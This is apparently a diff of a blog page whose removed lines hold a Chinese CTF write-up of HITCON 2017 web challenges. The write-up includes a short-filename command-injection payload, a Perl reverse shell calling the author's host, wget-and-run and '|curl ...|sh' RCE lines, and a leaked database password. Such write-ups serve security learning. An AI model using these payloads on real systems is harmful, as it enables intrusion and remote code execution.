@@ -68,7 +68,7 @@
 						<li>Tags</li>
 						
 						
-						<li>About</li>
+						<li>Über</li>
 						
 					</ul>
 				</div>
@@ -196,52 +196,7 @@
         <p>我來打醬油的<br>好像都沒貢獻到啥QQ</p>
 <p>來記錄一下Web簡單題的解法<br>和幾題賽中有碰，但沒解出來的QQ</p>
 <h2 id="Baby_First_Revenge_v1"><a href="#Baby_First_Revenge_v1" class="headerlink" title="Baby First Revenge v1"></a>Baby First Revenge v1</h2><p>這題和隊友討論很久才搞定QQ<br>其實一開始我們的方向就是正確的<br>比賽剛開始就在想，利用<code>&gt;ls</code>之類的寫檔<br>再用<code>ls&gt;z</code>，把產生的那些檔名塞到另一個檔案<br>最後串成指令去<code>sh z</code>跑</p>
-<p>但後來發現ls會有順序問題，難搞定<br>思路就愈走愈偏了QQ</p>
-<p><br></p>
-<p>後來我們搞老半天<br>成功想到可以這樣去爆所有檔案路徑<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;find</div><div class="line">* /&gt;z</div></pre></td></tr></table></figure></p>
-<p>然後發現<code>/home/fl4444g/</code>下有一個README.txt<br>接著就想辦法去讀它</p>
-<p>後來終於構造出<code>tar vcf a /</code>，把整個root打包起來下載(1.4G左右)<br>打開<code>/home/fl4444g/README.txt</code>看，崩潰<br>他給你mysql帳號密碼，說flag在裡面</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Flag is in the MySQL database</div><div class="line">fl4444g / SugZXUtgeJ52_Bvr</div></pre></td></tr></table></figure>
-<p>所以基本上就是要拿shell惹QQ</p>
-<p><br></p>
-<p>我後來是發現有<code>lsof</code>可以用<br>可以看其他人在幹啥XDDD<br>甚至也可以拿到別人的ip hash  (( md5(‘orange’.ip)<br>這一招真的對我們幫助很大XD</p>
-<p>因為我發現很多人卡著shell<br>就用他們的hash去看目錄下有啥<br>意外的大家目錄下都有<code>index.html</code></p>
-<p>然後內容都是reverse shell連線command<br>再看一下目錄下其他檔案<br>就大概能猜出<br>他們是用<code>wget</code>載他們server上的index.html<br>然後<code>sh *i</code>去reverse shell連回去</p>
-<p>想通這點，後面就很快了<br>就只要想辦法構造wget kaibro.tw之類的<br>這部分會蠻吃域名名稱的<br>如果域名是abcde.tw之類的會很難構造XD<br>隊友還因此買了一個x開頭的短域名<br>然後就秒構造一個payload拿到shell了</p>
-<p>我後來認真構造一下<br>終於能成功執行<code>wget kaibro.tw</code>惹</p>
-<p>payload如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&gt;echo</div><div class="line">&gt;wg\</div><div class="line">*&gt;.a</div><div class="line">rm w*</div><div class="line">&gt;et</div><div class="line">&gt;ka\</div><div class="line">*&gt;&gt;.a</div><div class="line">rm e*</div><div class="line">rm k*</div><div class="line">&gt;echo</div><div class="line">&gt;ibr\</div><div class="line">*&gt;&gt;.a</div><div class="line">rm i*</div><div class="line">&gt;o.t\</div><div class="line">*&gt;&gt;.a</div><div class="line">rm o*</div><div class="line">&gt;w</div><div class="line">*&gt;&gt;.a</div></pre></td></tr></table></figure>
-<p>結尾用<code>\</code>可以把多行指令串起來<br><code>*</code>可以把當前目錄下文件名展開當作指令跑</p>
-<p>(看起來很簡單，實際上自己踹，會發現很多細節要注意)</p>
-<p>執行完上面那坨之後<br>我們目錄下的<code>.a</code>就會長得像：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">wg\</div><div class="line">et ka\</div><div class="line">ibr\</div><div class="line">o.t\</div><div class="line">w</div></pre></td></tr></table></figure>
-<p><br><br>接著在我的server上放<code>index.html</code>:</p>
-<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e <span class="string">'use Socket;$i="kaibro.tw";$p=5566;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></div></pre></td></tr></table></figure>
-<p>所以只要<code>sh .a</code><br>就會執行wget下載reverse shell指令到index.html惹</p>
-<p>然後讓server listen一下<br><code>nc -vl 5566</code></p>
-<p>再來<code>sh i*</code>就會去run index.html上的指令惹<br>shell就彈出來了</p>
-<p>彈出來之後去連mysql，然後就可以抓出FLAG惹</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ mysql -u fl4444g -p</div><div class="line">Enter password: SugZXUtgeJ52_Bvr</div><div class="line"></div><div class="line">use fl4gdb;</div><div class="line">select * from this_is_the_fl4g;</div><div class="line">exit</div></pre></td></tr></table></figure>
-<p><code>hitcon{idea_from_phith0n,thank_you:)}</code></p>
-<p><br><br><br></p>
-<p>順便一提，我在這題收集了很多hash<br>然後在SSRFme那題也可以看別人在幹啥XD<br>只是都沒看到啥有用的<br>可能太晚收集了，沒收集到強隊的hash XDD<br>甚至還有人故意在127.0.0.1的目錄下塞假flag<br>我一開始還以為是有人讀出flag後忘記刪掉<br>一整個被騙，花了不少時間去確認</p>
-<p>原本還想學他，再塞幾個假flag騙人<br>後來想說算惹，就只塞了一個佛祖保佑圖<br>如果有人在SSRF這題看到，那87%就是我塞的XD</p>
-<p><br></p>
-<h2 id="Baby_Ruby_Escaping"><a href="#Baby_Ruby_Escaping" class="headerlink" title="Baby Ruby Escaping"></a>Baby Ruby Escaping</h2><p>這題搞很久，最後還是沒搞出來QQ<br>隊上好像也沒人對ruby熟，所以一直放置著</p>
-<p>看別人writeup才知道<br>原來socat連上後，按兩次tab就會顯示檔名…<br>超低能，都沒發現=.=<br>然後就可以用<code>ARGV&lt;&lt;&quot;thanks_readline_for_completing_the_name_of_flag&quot;</code><br>把檔名塞進argv中<br>之後直接<code>gets</code>，就會把裡面內容讀出來<br>(ruby會先去ARGV讀</p>
-<p><code>hitcon{Bl4ckb0x.br0k3n? ? puts(flag) : try_ag4in!}</code></p>
-<p>ruby is so hard QAQ</p>
-<p><br></p>
-<h2 id="Data__26amp_3B_mining"><a href="#Data__26amp_3B_mining" class="headerlink" title="Data &amp; mining"></a>Data &amp; mining</h2><p>這題一開始看很久<br>後來發現封包裡面有個地方連到xmrpool<br>推測他應該是在挖礦<br>跟題目名字和題目敘述也很吻合<br>告訴隊友後<br>隊友直接搜xmr就找到flag惹</p>
-<p>不過…<br>後來我才知道直接搜hitcon就能看到flag了=.=<br>連wireshark都不用開 頗呵<br>難怪兩小時就30隊解掉，感覺題目沒設計好R<br><code>hitcon{BTC_is_so_expensive_$$$$$$$}</code></p>
-<p><br></p>
-<h2 id="SSRFme"><a href="#SSRFme" class="headerlink" title="SSRFme"></a>SSRFme</h2><p>這題也是賽中沒解出來<br>第二天一直在搞這題<br>整個方向都想偏了<br>一直以為要像Discuz Pwn一樣打某個服務</p>
-<p>看了別人的write up<br>發現有人用一招很猥瑣的方式拿flag<br>類似這樣：<br><code>curl &#39;http://13.115.136.15/?url=a&amp;filename=|curl+http://kaibro.tw|sh&#39;</code><br><code>curl &#39;http://13.115.136.15/?url=file:|curl+http://kaibro.tw|sh&#39;</code></p>
-<p>就是perl的GET看到file會去open本地檔案<br>然後跟AIS3講的ruby open一樣<br>可以用|去執行指令 =&gt; RCE</p>
-<p>但是從source code可以看到，它會先去檢查檔案是否存在<br>例如<code>filename=|ls</code>會去建立|ls這個檔案<br>然後<code>url=file:|ls</code>就會執行ls惹<br>可以用|sleep+10之類的來測試一下，會卡個一下，說明有成功執行</p>
-<p>接著建立reverse shell，去跑/readflag就能拿flag惹<br><code>hitcon{Perl_&lt;3_y0u}</code></p>
-<p>真的沒想到這題能這樣解，覺得奇技淫巧</p>
-
+<p>但後來發現ls會有順序問題，難搞定<br>思路就愈走愈偏了QQ<br>
       
     </div>
     
@@ -254,6 +209,10 @@
 
       
 
+      
+        <p class="article-more-link">
+          <a  href="/2017/11/07/HITCON-CTF初賽/#more">more >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
